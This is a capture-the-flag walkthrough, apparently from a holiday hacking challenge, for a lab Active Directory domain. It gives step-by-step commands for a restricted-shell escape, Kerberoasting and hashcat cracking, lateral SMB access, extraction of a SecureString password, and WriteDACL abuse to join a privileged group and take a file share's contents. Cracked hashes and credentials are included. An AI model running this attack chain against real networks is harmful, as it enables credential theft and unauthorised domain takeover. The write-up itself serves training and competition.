# 1) create an account at register.elfu.org
# 2) ssh in with the credentials provided on port 2222
# 3) escape to python interpreter with ctrl+d
# 4) import pty; pty.spawn("/bin/bash")
# 5) `hostname` => grades.elfu.local
# 6) `ping elfu.local' => 10.128.1.53
# 7) GetUserSPNs.py -outputfile spns.txt -dc-ip 10.128.1.53 elfu.local/aggdqcegod:'Fsazctosw@' -request
# 8) hash saved in spns.txt
# 9) crack hash by running `hashcat -m 13100 -a 0 hash.txt userlist -r OneRuleToRuleThemAll.rule` passing the wordlist generated by `./cewl.rb -v -g 2 -w outfile --with-numbers https://register.elfu.org/register`

# returns =>

$krb5tgs$23$*elfu_svc$ELFU.LOCAL$elfu.local/elfu_svc*$15ca330409443945977c0a2592232c8f$daf37366c0da0025a1e368ecbdc0ea4f635acc2312d47f99a38818740aeece423ed7e621211ce5bbbd8100120af8beab168a67b23bdd3086fd9c892410b0dae634a9699d1706e3e3aacb65ee945cdd0806aff0294b45f87e8e2ab0c499f792f96c4dc4a0d31028c40b4ef7256e475baf506ec57dbbca3486f2d7fda23632d37f9da4b9e177009160a73d6bedf6239c272956af0023e58e43f29580b935079f37541764404f167cffeaaddda89db448f25d75c32fdbc33fba6f337f3f1d0aa5a7e13775c568030fcc42f7a3ce4c011ee82c09224d5ee0495ab553f041728a48dd1e3c794edcab9eb8f022d83e77feece629b7e8779024d3a0e9d47242d9cdb84cea57ef05e5b4486a13619d8761d50230c2858a0765c565315fa2985e25e0d23a750bf7e97c52b371c7ce81a084c6e6f8dc8337804ed04149bc89429ace311ff1bb352f37378a808c5d967f498586a90700796f361fb8f67b1f649e3d38e74599132a87663bf7e1c89db903e8e62c174b758233795f615a17753892ae96d17072f93b9bdb72b9c0705239b94ce0b3f473a9c522143c03334543ba295ccfd7601a51290a96ba1309fff9d8841103199f88a73aa79685f7721c04e067b5e1b73e4e590716d22d9acc308075ec5c04d52509392d10ee5114710c468e1e43a7dbdb995bd85a7c2033ecc13d0aba1fc915c913cfb8f633592854eeb3e0828be09f7aef230a8ee2efdaa9813502f1ae3e358b39505fbb41715da6d4bbe41a491830a38c314397addb45be11242ffa9170621b7b7e1b89f1c559bbd2efd16321c0096b19517ba10d6aa2650265b6519e36e3dda33634ea67e18f716602a4b2ab8e025ad8b8b4386344c362e710f36883cbfc971add157dd49f39df813781e5ca96a5333624dc2e71ee1dbbe258fc0992fe4f1af7f8aed40174db8a91a6265fdbf673d5bc02673c1bfa6aa302f3ca287a8a1384aca3042e5d5d426e1a95b754af3a7be9c57202d4c1a70285fa9e80c0d078558b796f5fb61acd65c271d04e32c215706d0f6e6bbd2121f123725c481d4827ca12e814732b27e3e3b80d5c3acec242b1cbf00eb867b76954b65ae6fc844fe3e847333a1c0a63e7f2849d7017b5150474335bdf5fc2bb09ea4bd7b34e9ac52700cac465408350cbf5f06127e9e7813296acc5bbc62b12a92f81384edb0c6162a7a767781eb9f4d9cbc6d9220fe396df22fe2f42bcc948fc0abfdd7a86b92754d83f435ae22eed1a8d03806560dd5e7e5e37f8299b365f345a81e0efe298d8fcf31b0056b8b633ae41ca7de2a78c35444fbe640bb9b9c08a20f229ed5a938eae9ae339f75a830dbbbfde5cbd334508c8d848f1acd6391b4b12c8a19c980aaef97aa4324008c918de8aed5a1c7f87d74fcca0d14e30d557a232502b8bea3cfba9189593571c0264f19d7c0594d6a3f5bcea2d463ccda2a304:Snow2021!

== elfu_svc:Snow2021!

# 10) arp -a => shows us the other hosts in the subnet, so we can use our credentials for the elfu_svc user to smbclient.py access each of the hosts and see what we might have access to. Eventually we find a host with an elfu_svc_resources share and we access it and download all of the .ps1 scripts within. 

# 11) cat *.ps1 | grep -C 20 elf => reveals a series of commands to use the remote_elf user:

```powershell
$SecStringPassword = "76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA"
$aPass = $SecStringPassword | ConvertTo-SecureString -Key 2,3,1,6,2,8,9,9,4,3,4,5,6,8,7,7
$aCred = New-Object System.Management.Automation.PSCredential -ArgumentList ("elfu.local\remote_elf", $aPass)
Invoke-Command -ComputerName 10.128.1.53 -ScriptBlock { Get-Process } -Credential $aCred -Authentication Negotiate
```

# 12) I modified the last command slightly to use 'enter-pssession' and removed the -scriptblock parameter entirely. This gives us a shell in the domain controller

# 13) i also had to decrypt the password using the following:
```powershell
$UnsecurePassword = (New-Object PSCredential "user",$aPass).GetNetworkCredential().Password
$UnsecurePassword
remote_elf:A1d655f7f5d98b10!
```

# 14) The remote_elf user has WriteDACL to the Research Department group. So we can add a member to that group and get access to their fileshare. 
# I found this by doing `net groups` and then doing Get-ADGroup "ResearchDepartment" and retrieving the OU string and then:
```powershell
$ADSI = [ADSI]"LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
$ADSI.psbase.ObjectSecurity.GetAccessRules($true,$true,[Security.Principal.NTAccount])
```

# Apply the genericall privilege to your original user, then use that privilege to add your original user to the researchusers group. src: https://github.com/chrisjd20/hhc21_powershell_snippets
# 15) Wait a minute or so and rerun your ldap query from above and you will see that you can now use smbclient.py to access the shares we coulnd't before:
```bash
smbclient.py elfu.local/tgbvzrzwri:'Mtpoyumgr#'@172.17.0.5
shares
use research_dep
get SantaSecretToAWonderfulHolidaySeason.pdf
scp -P 2222 tgbvzrzwri@grades.elfu.org:/home/tgbvzrzwri/SantaSecretToAWonderfulHolidaySeason.pdf .
```




